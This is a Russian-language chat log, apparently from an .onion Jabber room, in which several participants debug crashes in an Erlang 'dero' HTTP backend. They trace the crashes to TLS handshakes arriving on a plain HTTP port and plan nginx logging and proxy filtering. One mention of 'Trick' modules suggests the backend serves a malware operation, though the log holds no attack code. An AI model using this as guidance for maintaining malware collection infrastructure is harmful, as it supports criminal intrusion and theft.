Timestamp	From	To	Message
2021-08-27 10:23:28.267837	ttrr	buza	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-27 10:24:52.840285	ttrr	buza	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-27 10:25:59.986038	ttrr	buza	тута
2021-08-27 10:25:59.986515	ttrr	buza	ждем остальных
2021-08-27 10:25:59.987382	ttrr	buza	ок
2021-08-27 10:26:04.830105	buza	ttrr	хай
2021-08-27 10:26:04.831426	ttrr	buza	хай
2021-08-27 10:26:17.234573	buza	ttrr	я пароль не ставил на вход в конфу, это приемлемо?
2021-08-27 10:26:17.235232	ttrr	buza	я пароль не ставил на вход в конфу, это приемлемо?
2021-08-27 10:27:43.437940	ttrr	buza	это только для зарегистрированных участников
2021-08-27 10:27:48.741742	ttrr	buza	других тут не может быть
2021-08-27 10:28:03.704726	ttrr	buza	хоф остался
2021-08-27 10:30:23.085238	ttrr	buza	на месте
2021-08-27 10:30:28.882477	ttrr	buza	привет
2021-08-27 10:34:32.662119	ttrr	buza	короче . проблема в хттп в том . что клиент обрывает коннект раньше, чем передает данные . а именно я грешу на то, что клиент не передает самый последний перевод строки
2021-08-27 10:35:13.159029	ttrr	buza	от этого возникает краш на моей стороне и я не могу обработать запрос
2021-08-27 10:35:33.426058	buza	ttrr	в http есть три способа получить флаг конца передачи
2021-08-27 10:35:33.428199	ttrr	buza	в http есть три способа получить флаг конца передачи
2021-08-27 10:35:41.723544	buza	ttrr	1. Content-Length
2021-08-27 10:35:41.727078	ttrr	buza	1. Content-Length
2021-08-27 10:35:47.128748	buza	ttrr	2. Connection: close
2021-08-27 10:35:47.131450	ttrr	buza	2. Connection: close
2021-08-27 10:36:04.112043	buza	ttrr	3. Content-Encoding: chunked и дальше отслеживается цепочка чанков
2021-08-27 10:36:04.114815	ttrr	buza	3. Content-Encoding: chunked и дальше отслеживается цепочка чанков
2021-08-27 10:36:15.501318	buza	ttrr	клиент о котором ты говоришь какой метод использует?
2021-08-27 10:36:15.503688	ttrr	buza	клиент о котором ты говоришь какой метод использует?
2021-08-27 10:36:21.261721	buza	ttrr	ты сам какой метод форсируешь на сервере?
2021-08-27 10:36:21.264539	ttrr	buza	ты сам какой метод форсируешь на сервере?
2021-08-27 10:36:59.316439	buza	ttrr	defender добавь сюда flip и steller
2021-08-27 10:36:59.318926	ttrr	buza	defender добавь сюда flip и steller
2021-08-27 10:37:09.754602	ttrr	buza	да  я никакой не форсирую .есть либа . которая занимается хтпп .. она парсит и разбирает всё .. я лишь её вызываю . 
причем сделано это так .. что сначала работает она .. а потом уже я .. т.о. я не имею доступа напрямую к бинарному потоку данных
2021-08-27 10:37:22.166772	buza	ttrr	так вот разберись
2021-08-27 10:37:22.168826	ttrr	buza	так вот разберись
2021-08-27 10:37:36.831821	buza	ttrr	у клиентов есть причина использовать наиболее простой метод
2021-08-27 10:37:36.834026	ttrr	buza	у клиентов есть причина использовать наиболее простой метод
2021-08-27 10:37:55.059418	ttrr	buza	причина есть .если эта причина удовлетворяет спеицификациям хттп ..
2021-08-27 10:37:55.375276	buza	ttrr	например им сложно использовать chunked-передачу
2021-08-27 10:37:55.376651	ttrr	buza	например им сложно использовать chunked-передачу
2021-08-27 10:38:34.863809	buza	ttrr	и они скорее всего используют connection: close, то есть сигнал о конце передачи приходит с закрытием сокета
2021-08-27 10:38:34.865831	ttrr	buza	и они скорее всего используют connection: close, то есть сигнал о конце передачи приходит с закрытием сокета
2021-08-27 10:38:38.660945	ttrr	buza	если либа падает - это значит что клиент отправляет не то что ожидает эта либа . т.е. не хттп
2021-08-27 10:39:02.445462	buza	ttrr	ты должен дать требования тем кто пишет клиенты, что эта либа умеет, а чего не умеет
2021-08-27 10:39:02.448656	ttrr	buza	ты должен дать требования тем кто пишет клиенты, что эта либа умеет, а чего не умеет
2021-08-27 10:39:06.118329	ttrr	buza	либа ожидает на входе (бинарном) данные, но бинарный вход пуст .. вот парсер хттп и ломается
2021-08-27 10:39:17.550442	ttrr	buza	она умеет всё
2021-08-27 10:39:26.512879	buza	ttrr	как видим не всё
2021-08-27 10:39:26.514058	ttrr	buza	как видим не всё
2021-08-27 10:39:29.429924	ttrr	buza	это промышленное решение .. и её пользуются очень многие
2021-08-27 10:39:40.113760	buza	ttrr	давай на примерах
2021-08-27 10:39:40.115845	ttrr	buza	давай на примерах
2021-08-27 10:39:46.364690	ttrr	buza	примерах что ?
2021-08-27 10:39:51.187334	buza	ttrr	кривой посылки
2021-08-27 10:39:51.191023	ttrr	buza	кривой посылки
2021-08-27 10:40:03.663968	buza	ttrr	выложи сюда кривую посылку со стороны модуля и скажи что в ней криво
2021-08-27 10:40:03.665620	ttrr	buza	выложи сюда кривую посылку со стороны модуля и скажи что в ней криво
2021-08-27 10:40:15.077900	ttrr	buza	еще раз . у меня нет доступа к бинарному потоку ..
2021-08-27 10:40:19.331153	ttrr	buza	либа от меня это скрывает
2021-08-27 10:40:31.497173	buza	ttrr	ну HTTP-запрос ты же можешь перехватить?
2021-08-27 10:40:31.498684	ttrr	buza	ну HTTP-запрос ты же можешь перехватить?
2021-08-27 10:40:39.255519	ttrr	buza	я лишь могу по ошибке сказать где сломалось у неё и я вижу что она ожидает данные - но данных нет
2021-08-27 10:40:52.885162	buza	ttrr	то есть ты даже не видишь сырые HTTP
2021-08-27 10:40:52.889084	ttrr	buza	то есть ты даже не видишь сырые HTTP
2021-08-27 10:40:58.709751	ttrr	buza	нет
2021-08-27 10:41:03.477069	ttrr	buza	только через прокси какой могу
2021-08-27 10:41:07.271519	buza	ttrr	поставь mitmproxy
2021-08-27 10:41:07.275909	ttrr	buza	поставь mitmproxy
2021-08-27 10:41:18.237446	buza	ttrr	как можно отлаживать такую сложную систему наощупь?
2021-08-27 10:41:18.240705	ttrr	buza	как можно отлаживать такую сложную систему наощупь?
2021-08-27 10:41:18.451074	ttrr	buza	ну или логи сделать внутри либы
2021-08-27 10:41:22.816407	ttrr	buza	это уже по живому надо
2021-08-27 10:41:51.571245	buza	ttrr	и флип и стеллер могут предъявить запросы HTTP которые они генерируют, и могут попытаться их исправить в соответствии с твоими указаниями
2021-08-27 10:41:51.573122	ttrr	buza	и флип и стеллер могут предъявить запросы HTTP которые они генерируют, и могут попытаться их исправить в соответствии с твоими указаниями
2021-08-27 10:42:05.075063	ttrr	buza	в общем давай я посмотрю тогда бинарный поток . лог сделаю на живом сервере ..
2021-08-27 10:42:05.581165	buza	ttrr	тебе лишь надо сказать где ошибка, по твоей версии
2021-08-27 10:42:05.582298	ttrr	buza	тебе лишь надо сказать где ошибка, по твоей версии
2021-08-27 10:42:08.864149	ttrr	buza	может убрать либу? получать данные с сокета?
2021-08-27 10:42:10.027592	ttrr	buza	они тоже могут дать пример потока
2021-08-27 10:42:18.328249	ttrr	buza	парсить хттп сам будешь ?
2021-08-27 10:42:39.087328	buza	ttrr	@zulas так тут же важно именно сравнить то, что они отправляют, с тем, что ты принимаешь
2021-08-27 10:42:39.089012	ttrr	buza	@zulas так тут же важно именно сравнить то, что они отправляют, с тем, что ты принимаешь
2021-08-27 10:42:43.638886	ttrr	buza	мне щас надо на часок отлучится .. приду - сделаю - посмотрю
2021-08-27 10:42:44.192351	buza	ttrr	очень далеко не факт что это одно и то же
2021-08-27 10:42:44.193075	ttrr	buza	очень далеко не факт что это одно и то же
2021-08-27 10:42:44.437845	ttrr	buza	ну а какой выход?
2021-08-27 10:42:52.129081	buza	ttrr	уже не раз так было
2021-08-27 10:42:52.130771	ttrr	buza	уже не раз так было
2021-08-27 10:42:54.116230	ttrr	buza	выход - разбираться
2021-08-27 10:42:55.649371	buza	ttrr	по пути у нас прокладки
2021-08-27 10:42:55.654050	ttrr	buza	по пути у нас прокладки
2021-08-27 10:42:59.527892	buza	ttrr	и наши, и чужие
2021-08-27 10:42:59.529083	ttrr	buza	и наши, и чужие
2021-08-27 10:43:06.781641	buza	ttrr	они жонглируют заголовками
2021-08-27 10:43:06.786796	ttrr	buza	они жонглируют заголовками
2021-08-27 10:43:16.159578	buza	ttrr	они имеют право перекодировать пакеты
2021-08-27 10:43:16.180760	ttrr	buza	они имеют право перекодировать пакеты
2021-08-27 10:43:18.436074	ttrr	buza	отошел
2021-08-27 12:29:10.137490	ttrr	buza	я на живом сейчас экспериментирую
2021-08-27 12:49:43.333972	ttrr	buza	2021-08-27 15:43:18.250 [info] <0.173.0> Data: <<22,3,1,0,122,1,0,0,118,3,1,97,40,221,230,188,215,55,88,76,161,53,70,161,100,228,44,187,170,189,227,118,111,91,127,244,240,143,161,47,114,14,107,0,0,14,192,10,192,9,192,20,192,19,0,53,0,47,0,10,1,0,0,63,0,0,0,28,0,26,0,0,23,116,114,97,99,107,46,97,110,97,108,121,116,105,99,115,45,100,97,116,97,46,105,111,0,10,0,8,0,6,0,29,0,23,0,24,0,11,0,2,1,0,0,35,0,0,0,23,0,0,255,1,0,1,0>> 
2021-08-27 15:43:18.251 [error] emulator Error in process <0.173.0> on node dero_server@server with exit value:
2021-08-27 15:43:18.251 [error] <0.173.0>@cowboy_protocol:parse_method:169 Ranch listener http terminated with reason: no function clause matching cowboy_protocol:parse_method(<<>>, {state,#Port<0.4001>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[...]}],...}, <<22,3,1,0,122,1,0,0,118,3,1,97,40,221,230,188,215,55,88,76,161,53,70,161,100,228,44,187,170,189,...>>) line 169

вот из лога бинарный поток
2021-08-27 12:49:51.524311	ttrr	buza	который вызывает проблему
2021-08-27 12:50:38.329503	ttrr	buza	а вот это:

2021-08-27 15:43:18.007 [info] <0.158.0> Data: <<22,3,1,2,0,1,0,1,252,3,3,85,217,147,101,152,84,237,168,57,127,64,130,166,246,5,28,145,200,82,174,223,48,129,23,230,170,167,24,30,118,147,105,32,112,120,62,28,164,221,67,133,188,32,79,97,132,30,48,15,140,239,224,165,168,5,1,6,12,28,143,159,175,32,133,143,0,54,218,218,19,1,19,2,19,3,192,44,192,43,204,169,192,48,192,47,204,168,192,36,192,35,192,10,192,9,192,40,192,39,192,20,192,19,0,157,0,156,0,61,0,60,0,53,0,47,192,8,192,18,0,10,1,0,1,125,234,234,0,0,0,0,0,23,0,21,0,0,18,103,97,116,101,119,97,121,46,105,99,108,111,117,100,46,99,111,109,0,23,0,0,255,1,0,1,0,0,10,0,12,0,10,202,202,0,29,0,23,0,24,0,25,0,11,0,2,1,0,0,16,0,14,0,12,2,104,50,8,104,116,116,112,47,49,46,49,0,5,0,5,1,0,0,0,0,0,13,0,24,0,22,4,3,8,4,4,1,5,3,2,3,8,5,8,5,5,1,8,6,6,1,2,1,0,18,0,0,0,51,0,43,0,41,202,202,0,1,0,0,29,0,32,233,161,223,78,0,73,53,96,119,159,215,212,71,216,72,236,103,226,140,165,145,139,122,217,41,240,23,248,115,130,152,66,0,45,0,2,1,1,0,43,0,11,10,154,154,3,4,3,3,3,2,3,1,250,250,0,1,0,0,21,0,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,...>>
 State: {state,#Port<0.3896>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630068203006}
 ReqEmpty 0

проблемы не вызывает
2021-08-27 12:51:26.604074	ttrr	buza	или вот это:


2021-08-27 15:43:18.064 [info] <0.162.0> Data: <<22,3,1,2,0,1,0,1,252,3,3,14,44,33,56,26,185,206,231,236,178,193,16,165,188,27,22,214,160,174,190,146,134,183,85,117,16,235,49,77,234,9,129,32,12,245,86,126,154,166,11,108,160,171,200,195,227,185,95,124,147,27,250,187,108,120,82,136,198,154,167,107,53,75,254,175,0,32,250,250,19,3,19,1,19,2,204,169,204,168,192,43,192,47,192,44,192,48,192,19,192,20,0,156,0,157,0,47,0,53,1,0,1,147,138,138,0,0,0,0,0,20,0,18,0,0,15,109,97,105,108,46,103,111,111,103,108,101,46,99,111,109,0,23,0,0,255,1,0,1,0,0,10,0,10,0,8,202,202,0,29,0,23,0,24,0,11,0,2,1,0,0,35,0,0,0,16,0,14,0,12,2,104,50,8,104,116,116,112,47,49,46,49,0,5,0,5,1,0,0,0,0,0,13,0,18,0,16,4,3,8,4,4,1,5,3,8,5,5,1,8,6,6,1,0,18,0,0,0,51,0,43,0,41,202,202,0,1,0,0,29,0,32,18,248,125,69,188,229,9,34,184,87,206,13,209,25,177,114,240,187,218,2,250,42,123,238,190,210,236,200,51,78,3,30,0,45,0,2,1,1,0,43,0,11,10,42,42,3,4,3,3,3,2,3,1,0,27,0,3,2,0,2,68,105,0,5,0,3,2,104,50,170,170,0,1,0,0,21,0,196,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0>>
2021-08-27 12:54:00.998917	ttrr	buza	@defender если очень надо то я могу перехватывать такой краш - и не показывать его.
2021-08-27 12:55:03.822195	buza	ttrr	ничего не понятно
2021-08-27 12:55:03.823113	ttrr	buza	ничего не понятно
2021-08-27 12:55:15.832458	buza	ttrr	как это соотносится с HTTP-запросом? какая это его часть?
2021-08-27 12:55:15.833973	ttrr	buza	как это соотносится с HTTP-запросом? какая это его часть?
2021-08-27 12:55:54.277393	buza	ttrr	это после распаковки из контейнера multipart/form-data? или это данные вместе с контейнером?
2021-08-27 12:55:54.278885	ttrr	buza	это после распаковки из контейнера multipart/form-data? или это данные вместе с контейнером?
2021-08-27 12:56:03.728703	buza	ttrr	или там вообще нет контейнера?
2021-08-27 12:56:03.729537	ttrr	buza	или там вообще нет контейнера?
2021-08-27 12:57:49.424858	buza	ttrr	сними соответствующие HTTP-запросы, поставь прокси перед сервером
2021-08-27 12:57:49.427043	ttrr	buza	сними соответствующие HTTP-запросы, поставь прокси перед сервером
2021-08-27 13:02:26.807514	ttrr	buza	это самое начало
2021-08-27 13:02:41.482226	ttrr	buza	вот как идет поток .. вот так и логирует
2021-08-27 13:03:07.916738	ttrr	buza	тебе в текстовом виде ? так там миллион управляющих символов каких-то
2021-08-27 13:03:14.346463	ttrr	buza	где то в середине http/1.1
2021-08-27 13:03:17.207162	ttrr	buza	виднеется
2021-08-27 13:03:42.533109	buza	ttrr	можно файлом
2021-08-27 13:03:42.549902	ttrr	buza	можно файлом
2021-08-27 13:04:01.499518	buza	ttrr	ты можешь локализовать сбойный байт?
2021-08-27 13:04:01.500649	ttrr	buza	ты можешь локализовать сбойный байт?
2021-08-27 13:04:01.818485	ttrr	buza	ок щас сделаю
2021-08-27 13:04:07.445032	buza	ttrr	даже хотя бы в этом потоке
2021-08-27 13:04:07.445839	ttrr	buza	даже хотя бы в этом потоке
2021-08-27 13:04:18.856934	buza	ttrr	сказать - байт номер такой-то приводит к вылету
2021-08-27 13:04:18.858832	ttrr	buza	сказать - байт номер такой-то приводит к вылету
2021-08-27 13:05:55.254009	ttrr	buza	он говорит что метода нет в хттп
2021-08-27 13:06:01.243998	ttrr	buza	cowboy_protocol:parse_method(<<>>
2021-08-27 13:06:06.854604	ttrr	buza	пустой - поток обрывается
2021-08-27 13:08:00.856211	ttrr	buza	наверно пришло время обновить либу .. а то она уже далеко вперед ушла
2021-08-27 13:09:11.124479	ttrr	buza	либа 6 летней давности
2021-08-27 13:09:39.654606	buza	ttrr	протокол не сильно менялся за эти 6 лет
2021-08-27 13:09:39.656168	ttrr	buza	протокол не сильно менялся за эти 6 лет
2021-08-27 13:11:32.564031	ttrr	buza	я бы сказал не менялся )
2021-08-27 13:12:55.662718	ttrr	buza	куда файл закинуть ?
2021-08-27 13:16:15.450574	ttrr	buza	https://disk.yandex.ru/d/zIsWj8NjR53tGg
2021-08-27 13:16:18.195383	ttrr	buza	вот 2 файла
2021-08-27 13:17:30.256973	ttrr	buza	flip и steller отправил приглашения
2021-08-27 13:18:23.925380	buza	ttrr	мне все равно пока ничего не ясно из файлов
2021-08-27 13:18:23.927316	ttrr	buza	мне все равно пока ничего не ясно из файлов
2021-08-27 13:18:59.117015	buza	ttrr	по-прежнему неясно что это вообще такое - это значение поля Data? я не могу так гадать
2021-08-27 13:18:59.118802	ttrr	buza	по-прежнему неясно что это вообще такое - это значение поля Data? я не могу так гадать
2021-08-27 13:21:57.110494	ttrr	buza	это бинарный поток который мне приходит ..
2021-08-27 13:22:00.248481	ttrr	buza	вот с первого байта
2021-08-27 13:22:25.681191	ttrr	buza	давайте поставлю nginx между клиентом и деро
2021-08-27 13:22:31.475796	ttrr	buza	поставь
2021-08-27 13:22:37.701730	ttrr	buza	и там может по логам что поймем
2021-08-27 13:22:37.844133	ttrr	buza	и пусть логирует все запросы ..
2021-08-27 13:22:46.285486	ttrr	buza	ок сейчас
2021-08-27 13:22:53.640201	ttrr	buza	запрос . тело . ответ
2021-08-27 13:23:09.182801	ttrr	buza	я сменю порт у деро, на 8082 будут нджинкс принимать
2021-08-27 13:24:01.560672	ttrr	buza	а, драйвера не добавил сюда
2021-08-27 13:24:08.082850	ttrr	buza	нужен он?
2021-08-27 13:24:55.920814	ttrr	buza	я хз . . я просто пишу сюда что вижу у себя .. а кто нужен я хз
2021-08-27 13:25:13.262560	ttrr	buza	вот кто это генерит - тот и нужен ..
2021-08-27 13:28:48.359545	buza	ttrr	нам нужен прилетевший сырой HTTP-запрос как есть
2021-08-27 13:28:48.360902	ttrr	buza	нам нужен прилетевший сырой HTTP-запрос как есть
2021-08-27 13:28:57.835750	buza	ttrr	и нужно указание - что в нем криво
2021-08-27 13:28:57.836329	ttrr	buza	и нужно указание - что в нем криво
2021-08-27 13:34:50.150693	buza	ttrr	[16:24:01] <defender> а, драйвера не добавил сюда
обязательно нужен
2021-08-27 13:34:50.151702	ttrr	buza	[16:24:01] <defender> а, драйвера не добавил сюда
обязательно нужен
2021-08-27 13:39:46.752366	ttrr	buza	> нам нужен прилетевший сырой HTTP-запрос как есть
я уже показал что мне прилетает .. вот это сырые данные
2021-08-27 13:40:50.328851	buza	ttrr	подождем что дефендер скажет
2021-08-27 13:40:50.330919	ttrr	buza	подождем что дефендер скажет
2021-08-27 13:42:25.142860	ttrr	buza	мне все равно пока ничего не ясно из файлов
2021-08-27 13:42:25.143568	ttrr	buza	по-прежнему неясно что это вообще такое - это значение поля Data? я не могу так гадать
2021-08-27 13:42:25.144621	ttrr	buza	вот с первого байта
2021-08-27 13:42:25.145164	ttrr	buza	давайте поставлю nginx между клиентом и деро
2021-08-27 13:42:25.145420	ttrr	buza	это бинарный поток который мне приходит ..
2021-08-27 13:42:25.145817	ttrr	buza	поставь
2021-08-27 13:42:25.146216	ttrr	buza	и там может по логам что поймем
2021-08-27 13:42:25.146486	ttrr	buza	и пусть логирует все запросы ..
2021-08-27 13:42:25.146877	ttrr	buza	ок сейчас
2021-08-27 13:42:25.147896	ttrr	buza	я сменю порт у деро, на 8082 будут нджинкс принимать
2021-08-27 13:42:25.148161	ttrr	buza	запрос . тело . ответ
2021-08-27 13:42:25.148552	ttrr	buza	а, драйвера не добавил сюда
2021-08-27 13:42:25.148896	ttrr	buza	нужен он?
2021-08-27 13:42:25.149557	ttrr	buza	я хз . . я просто пишу сюда что вижу у себя .. а кто нужен я хз
2021-08-27 13:42:25.150109	ttrr	buza	вот кто это генерит - тот и нужен ..
2021-08-27 13:42:25.150642	ttrr	buza	нам нужен прилетевший сырой HTTP-запрос как есть
2021-08-27 13:42:25.151376	ttrr	buza	и нужно указание - что в нем криво
2021-08-27 13:42:25.151987	ttrr	buza	[16:24:01] <defender> а, драйвера не добавил сюда
обязательно нужен
2021-08-27 13:42:25.152713	ttrr	buza	> нам нужен прилетевший сырой HTTP-запрос как есть
я уже показал что мне прилетает .. вот это сырые данные
2021-08-27 13:42:25.153554	ttrr	buza	подождем что дефендер скажет
2021-08-27 13:49:10.567965	ttrr	buza	дело в том, что данные в dero посылает не один модуль
2021-08-27 13:49:18.701914	ttrr	buza	их много
2021-08-27 13:49:49.130176	buza	ttrr	мы тут с зуласом разбираемся, там странно всё
2021-08-27 13:49:49.134506	ttrr	buza	мы тут с зуласом разбираемся, там странно всё
2021-08-27 13:50:18.926960	ttrr	buza	нужно дорабатывать сущесутвующую, использовать другую либу, но чтобы ничего не падало
2021-08-27 13:53:32.721143	ttrr	buza	и расчитывать на то, что данные будут невалидные
2021-08-27 13:54:01.214288	ttrr	buza	их могут специально посылать
2021-08-27 13:56:32.227514	ttrr	buza	и расчитывать на то, что данные будут невалидные
2021-08-27 13:56:32.228063	ttrr	buza	их могут специально посылать
2021-08-27 13:58:05.088984	ttrr	buza	ну я либу могу модифицировать . просто чтобы если экзепшн в какой-то области .. то в лог не падало и даже ответ можно слать я думаю
2021-08-27 13:58:24.127639	buza	ttrr	зулас говорит, что вот эти данные на яндекс диске - это и есть HTTP-запросы со всеми заголовками
2021-08-27 13:58:24.130705	ttrr	buza	зулас говорит, что вот эти данные на яндекс диске - это и есть HTTP-запросы со всеми заголовками
2021-08-27 13:58:26.260873	buza	ttrr	точнее без них
2021-08-27 13:58:26.263766	ttrr	buza	точнее без них
2021-08-27 13:58:29.816978	buza	ttrr	а там бинарный поток
2021-08-27 13:58:29.818089	ttrr	buza	а там бинарный поток
2021-08-27 13:58:48.995649	buza	ttrr	и если он хоть как-то парсится либой бэкенда, то это получается HTTP/2
2021-08-27 13:58:48.997198	ttrr	buza	и если он хоть как-то парсится либой бэкенда, то это получается HTTP/2
2021-08-27 13:59:02.540606	buza	ttrr	и тогда возникает вопрос
- откуда у нас вообще HTTP/2?
2021-08-27 13:59:02.542109	ttrr	buza	и тогда возникает вопрос
- откуда у нас вообще HTTP/2?
2021-08-27 13:59:21.601259	buza	ttrr	ну или QUIC или еще какая бинарная гугловская фигня
2021-08-27 13:59:21.603372	ttrr	buza	ну или QUIC или еще какая бинарная гугловская фигня
2021-08-27 13:59:40.079016	buza	ttrr	defender: на прокладках случайно не включена конверсия в HTTP/2 ?
2021-08-27 13:59:40.080471	ttrr	buza	defender: на прокладках случайно не включена конверсия в HTTP/2 ?
2021-08-27 14:04:43.780200	ttrr	buza	нет
2021-08-27 14:04:57.491155	ttrr	buza	прокладки - роутеры, что приняли то и передали
2021-08-27 14:07:15.101595	ttrr	buza	отлучился
2021-08-27 14:09:00.005426	buza	ttrr	defender: еще больше нужны сырые http-запросы теперь, в свете данных зуласа
2021-08-27 14:09:00.007195	ttrr	buza	defender: еще больше нужны сырые http-запросы теперь, в свете данных зуласа
2021-08-27 14:09:10.157884	buza	ttrr	если подтвердится что там не HTTP/1.1 то это очень интересно
2021-08-27 14:09:10.160638	ttrr	buza	если подтвердится что там не HTTP/1.1 то это очень интересно
2021-08-27 14:09:16.331347	buza	ttrr	нужно подтверждение от тебя
2021-08-27 14:09:16.334894	ttrr	buza	нужно подтверждение от тебя
2021-08-27 14:14:50.297238	ttrr	buza	я делаю нджинкс
2021-08-27 14:15:45.062442	buza	ttrr	кстати zulas: ты можешь "хороший" запрос проследить до базы?
2021-08-27 14:15:45.066224	ttrr	buza	кстати zulas: ты можешь "хороший" запрос проследить до базы?
2021-08-27 14:15:51.253427	buza	ttrr	вот тот бинарный
2021-08-27 14:15:51.256444	ttrr	buza	вот тот бинарный
2021-08-27 14:53:54.442245	ttrr	buza	что значит послать до базы ?
2021-08-27 14:53:58.874059	ttrr	buza	@buza
2021-08-27 14:54:32.238554	buza	ttrr	не послать, а проследить
2021-08-27 14:54:32.239541	ttrr	buza	не послать, а проследить
2021-08-27 14:54:40.782741	buza	ttrr	вот тебе пришел этот бинарный запрос
2021-08-27 14:54:40.785315	ttrr	buza	вот тебе пришел этот бинарный запрос
2021-08-27 14:54:51.035479	buza	ttrr	и ты говоришь что первый из них нормально парсится и отрабатывает
2021-08-27 14:54:51.038342	ttrr	buza	и ты говоришь что первый из них нормально парсится и отрабатывает
2021-08-27 14:55:04.009291	buza	ttrr	раз так, он должен положить в базу данных новую запись
2021-08-27 14:55:04.011151	ttrr	buza	раз так, он должен положить в базу данных новую запись
2021-08-27 14:55:10.352481	buza	ttrr	эту запись можно увидеть?
2021-08-27 14:55:10.355612	ttrr	buza	эту запись можно увидеть?
2021-08-27 14:55:14.255960	ttrr	buza	там больше нет ничего ..
2021-08-27 14:55:22.134185	ttrr	buza	ну т.е. до базы оно не доходит
2021-08-27 14:55:28.794895	buza	ttrr	ни первый ни второй?
2021-08-27 14:55:28.799081	ttrr	buza	ни первый ни второй?
2021-08-27 14:55:31.162587	ttrr	buza	просто в логи ничего не пишется
2021-08-27 14:55:37.827956	ttrr	buza	да
2021-08-27 14:55:50.741679	buza	ttrr	ну так может это и не мы?
2021-08-27 14:55:50.743607	ttrr	buza	ну так может это и не мы?
2021-08-27 14:55:50.934690	ttrr	buza	может это боты поисковые и т.п ?
2021-08-27 14:56:35.196483	buza	ttrr	defender: ты можешь на прокладках отрезать все что не HTTP/1.1 ?
2021-08-27 14:56:35.199054	ttrr	buza	defender: ты можешь на прокладках отрезать все что не HTTP/1.1 ?
2021-08-27 14:56:48.976996	buza	ttrr	все HTTP/2 QUIC и прочий модный кал
2021-08-27 14:56:48.981091	ttrr	buza	все HTTP/2 QUIC и прочий модный кал
2021-08-27 14:57:01.397045	buza	ttrr	и запретить доступ к веб-серверу не с прокладки
2021-08-27 14:57:01.400904	ttrr	buza	и запретить доступ к веб-серверу не с прокладки
2021-08-30 07:55:38.729307	ttrr	buza	вот тебе пришел этот бинарный запрос
2021-08-30 07:55:38.730187	ttrr	buza	и ты говоришь что первый из них нормально парсится и отрабатывает
2021-08-30 07:55:38.731720	ttrr	buza	раз так, он должен положить в базу данных новую запись
2021-08-30 07:55:38.732592	ttrr	buza	эту запись можно увидеть?
2021-08-30 07:55:38.734866	ttrr	buza	там больше нет ничего ..
2021-08-30 07:55:38.736092	ttrr	buza	ну т.е. до базы оно не доходит
2021-08-30 07:55:38.736362	ttrr	buza	просто в логи ничего не пишется
2021-08-30 07:55:38.736556	ttrr	buza	ни первый ни второй?
2021-08-30 07:55:38.749881	ttrr	buza	да
2021-08-30 07:55:38.751220	ttrr	buza	ну так может это и не мы?
2021-08-30 07:55:38.752466	ttrr	buza	может это боты поисковые и т.п ?
2021-08-30 07:55:38.753796	ttrr	buza	defender: ты можешь на прокладках отрезать все что не HTTP/1.1 ?
2021-08-30 07:55:38.763748	ttrr	buza	все HTTP/2 QUIC и прочий модный кал
2021-08-30 07:55:38.764472	ttrr	buza	и запретить доступ к веб-серверу не с прокладки
2021-08-30 07:55:38.765942	ttrr	buza	говорю же там все как есть передает
2021-08-30 07:55:38.766410	ttrr	buza	нет не могу
2021-08-30 07:55:38.766633	ttrr	buza	сделал через нджинкс
2021-08-30 07:55:38.768212	ttrr	buza	углубленное позже сделаю
2021-08-30 07:55:38.768450	ttrr	buza	но пока логирование обычное
2021-08-30 07:55:38.769156	ttrr	buza	@defender -- так всё вопрос закрыт ?
2021-08-30 08:19:29.153440	buza	ttrr	defender: а почему не могу?
https://stackoverflow.com/questions/39453027/how-to-disable-http2-in-nginx
я вот так имею в виду - тут пишут что "могу"
2021-08-30 08:19:29.154821	ttrr	buza	defender: а почему не могу?
https://stackoverflow.com/questions/39453027/how-to-disable-http2-in-nginx
я вот так имею в виду - тут пишут что "могу"
2021-08-30 08:43:21.002751	buza	ttrr	zulas: есть сомнение что те дампы крешей что ты привел - что это были посылки модулей трика
2021-08-30 08:43:21.004827	ttrr	buza	zulas: есть сомнение что те дампы крешей что ты привел - что это были посылки модулей трика
2021-08-30 08:44:15.469393	ttrr	buza	ну вообще не были . они были отброшены т.к. не распаршены . ну и очевидно что хттп2 .а не хттп1
2021-08-30 08:44:17.032042	buza	ttrr	нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво
2021-08-30 08:44:17.033112	ttrr	buza	нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво
2021-08-30 08:44:38.453192	ttrr	buza	для начала давайте отфильтруем внешние запросы .
2021-08-30 08:44:47.716060	ttrr	buza	я думаю проблема сама собой решится .
2021-08-30 08:45:02.141902	ttrr	buza	потому что не может один и тот же модуль\код выдавать 2 разных протокола .
2021-08-30 08:45:02.575404	buza	ttrr	zulas: поясни мне проблему с крешем
